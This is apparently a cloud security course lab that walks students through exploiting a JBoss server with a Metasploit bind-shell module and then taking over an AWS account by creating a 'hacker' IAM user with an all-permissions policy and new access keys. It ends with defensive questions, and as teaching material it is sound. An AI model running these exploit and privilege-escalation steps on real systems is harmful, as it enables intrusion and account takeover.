# Lab 3

**Table of Contents**

- [Establish a Foothold](##establish-a-foothold)
- [Hack the Cloud](##hack-the-cloud)

# Escalating Privileges in AWS

In this lab we will be performing account takeover.

*Resources:*

- [AWS Identity and Access Management](http://docs.aws.amazon.com/cli/latest/reference/iam/)

---

## Establish a Foothold

1. Continuing from Lab 2, establish a foothold on the JBoss application server (target 2).

  Run a shell.

  ```
> shell
python -c 'import pty; pty.spawn("/bin/bash")'
[ec2-user@ip-10-0-2-43 jboss-5.1.0.GA]$ cd ~
  ```

2. If the pivot exploit fails, exploit the JBoss server directly. Remember to use the instructor provided port for the `LPORT` setting below.

  ```
use exploit/multi/http/jboss_invoke_deploy
set RHOST 52.41.95.90
set target 1
set payload java/shell/bind_tcp
set LPORT 10001
exploit
  ```

  Wait for the exploit to finish and then type: `python -c 'import pty; pty.spawn("/bin/bash")'`.

## Hack the Cloud

1. On the system you have just compromised, create a hacker user, and group and add the user to the group. The hacker username and group should match your student ID.

  E.g., `student1` would create a user named `hacker1`. You can do this like so:

  ```
$ aws iam create-user --user-name hacker1
$ aws iam create-group --group-name hacker1
$ aws iam add-user-to-group --group-name hacker1 --user-name hacker1
  ```

2. Attach an all-powerful policy to the group.

  ```
$ aws iam put-group-policy --group-name hacker1 --policy-name hacker1 \
    --policy-document '{"Version": "2012-10-17", "Statement": [{"Sid": "Stmt1437414476731", "Action": "*","Effect": "Allow", "Resource": "*" }]}'

  ```

3. Create API Access keys.

  ```
$ aws iam create-access-key --user-name hacker1
  ```

  Output:
  ```
{
    "AccessKey": {
        "UserName": "hacker1",
        "Status": "Active",
        "CreateDate": "2016-06-30T18:34:48.637Z",
        "SecretAccessKey": "...",
        "AccessKeyId": "AKI..."
    }
}
  ```

4. Use what you have learned in previous weeks to open up the console using the API access keys we just created.

  Answer these questions:

  * Does your hacker user have more privileges than the instance from where you created the user?
  * How would you classify this attack?
  * What changes would you make to the policy attached to target 2 so that this attack is not possible?
